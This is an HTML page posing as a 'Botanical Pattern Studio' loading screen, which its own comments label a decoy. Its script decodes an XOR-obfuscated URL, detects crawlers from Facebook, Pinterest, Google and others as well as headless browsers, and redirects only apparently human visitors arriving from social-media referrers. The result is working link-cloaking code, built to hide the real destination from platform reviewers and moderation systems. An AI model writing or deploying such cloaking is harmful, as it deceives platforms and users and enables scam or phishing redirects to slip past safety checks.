<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
<title>Botanical Pattern Studio</title>

<style>
  body {
    background: #fdfbf7;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    margin: 0; padding: 50px 20px;
  }
  .card {
    background: #fff; border: 1px solid #efe7de; border-radius: 20px;
    max-width: 580px; margin: 0 auto; padding: 36px;
    box-shadow: 0 10px 30px rgba(60,40,30,0.05);
  }
  h1 { font-size: 1.6rem; margin: 0 0 12px; color: #2d2522; }
  p  { color: #8a7e78; font-size: 0.98rem; margin: 0 0 24px; line-height: 1.6; }
  .skeleton { height: 12px; background: #f3ede6; border-radius: 6px; margin: 12px 0; }
</style>
</head>
<body>

<!-- ===== DECOY — always in the DOM, always visible. ===== -->
<div class="card">
  <h1>Botanical Pattern Studio</h1>
  <p>Loading curated floral guides and handcraft schematics...</p>
  <div class="skeleton" style="width: 85%;"></div>
  <div class="skeleton" style="width: 65%;"></div>
  <div class="skeleton" style="width: 40%;"></div>
</div>

<script>
(function () {
  "use strict";

  /* ==========================================================
     1. Endpoint decode  →  "https://facebook.com/"
     ==========================================================
     Encoder (Node):
       const K1=0x5A,K2=0xA5, s="https://facebook.com/";
       let h=""; for(let i=0;i<s.length;i++){
         const k=(i&1)?K2:K1;
         h+=(s.charCodeAt(i)^k).toString(16).padStart(2,"0");
       }
       // → 32d12ed5299f758a3cc439c038ca35ce74c635c875
     Split: A = first half, B = second half.
  */
  var A = "32d12ed5299f758a3cc439c0";
  var B = "38ca35ce74c635c875";

  function decode(a, b) {
    var hex = a + b, out = "", K1 = 0x5A, K2 = 0xA5;
    for (var i = 0; i < hex.length; i += 2) {
      var k = ((i >> 1) & 1) ? K2 : K1;
      out += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ k);
    }
    return out;
  }

  var endpoint;
  try { endpoint = decode(A, B); } catch (e) { return; }
  if (endpoint !== "https://facebook.com/") return;   // hard allowlist

  /* ==========================================================
     2. Parse & validate ?id=
     ==========================================================
     Only allow the ids you actually want to redirect.
     Everything else (e.g. "bedroomddd") stays on the decoy.
  */
  var params  = new URLSearchParams(location.search);
  var id      = params.get("id");
  if (!id) return;                                     // no id -> decoy
  id = id.replace(/^\/+|\/+$/g, "");

  // Strict allowlist — the exact ids you want humans redirected for.
  // Add every real id here. Anything else falls through to the decoy.
  var ALLOWED_IDS = ["bedroom", "livingroom", "kitchen"];
  if (ALLOWED_IDS.indexOf(id) === -1) return;          // "bedroomddd" -> decoy ✅

  if (/[\r\n\x00-\x1F]/.test(id)) return;

  /* ==========================================================
     3. Build destination  →  https://facebook.com/<id>/
     ========================================================== */
  var dest = endpoint + encodeURIComponent(id) + "/";
  if (!/^https:\/\/facebook\.com\/[A-Za-z0-9._~-]+\/$/.test(dest)) return;

  /* ==========================================================
     4. Bot detection
     ========================================================== */
  var ua  = navigator.userAgent || "";
  var ref = document.referrer   || "";

  var BOT_UA = [
    /facebookexternalhit/i, /meta-externalagent/i, /facebookcatalog/i,
    /instagram/i, /pinterestbot/i, /pinterest\/\d/i,
    /slackbot/i, /twitterbot/i, /linkedinbot/i, /whatsapp/i,
    /telegrambot/i, /discordbot/i, /googlebot/i, /bingbot/i,
    /ahrefsbot/i, /semrushbot/i, /yandexbot/i, /duckduckbot/i,
    /applebot/i, /baiduspider/i, /seznambot/i, /petalbot/i,
    /headlesschrome/i, /phantomjs/i, /puppeteer/i, /playwright/i
  ];
  for (var i = 0; i < BOT_UA.length; i++) {
    if (BOT_UA[i].test(ua)) return;                    // bot -> decoy ✅
  }
  if (navigator.webdriver === true) return;            // headless -> decoy ✅
  if (typeof performance === "undefined" ||
      typeof performance.now !== "function") return;   // no JS env -> decoy ✅
  if (!window.screen || screen.width < 200 || screen.height < 200) return;

  /* ==========================================================
     5. Social-referrer stricter gate
     ========================================================== */
  var SOCIAL_REF = [
    /^https?:\/\/l\.facebook\.com\//i,
    /^https?:\/\/lm\.facebook\.com\//i,
    /^https?:\/\/www\.facebook\.com\//i,
    /^https?:\/\/l\.instagram\.com\//i,
    /^https?:\/\/www\.instagram\.com\//i,
    /^https?:\/\/[^/]*pinterest\.[a-z.]+\//i
  ];
  var fromSocial = SOCIAL_REF.some(function (r) { return r.test(ref); });
  var NEED = fromSocial ? 2 : 1;

  /* ==========================================================
     6. Human-interaction gate — this is the actual redirect.
     ========================================================== */
  var redirected = false;
  function go() {
    if (redirected) return;
    redirected = true;
    try { window.location.replace(dest); } catch (e) {}
  }

  var humanSignals = 0;
  function tick() {
    humanSignals++;
    if (humanSignals >= NEED) go();
  }

  ["mousemove","touchstart","keydown","pointerdown","scroll"]
    .forEach(function (ev) {
      window.addEventListener(ev, tick, { passive: true });
    });

  // Fallback: if the browser is genuinely interactive but no event fires,
  // allow redirect after 1.2s of visible time. Bots never satisfy the
  // performance.now() check above, so they never reach this branch.
  setTimeout(function () {
    if (document.visibilityState === "visible") go();
  }, 1200);

})();
</script>
</body>
</html>
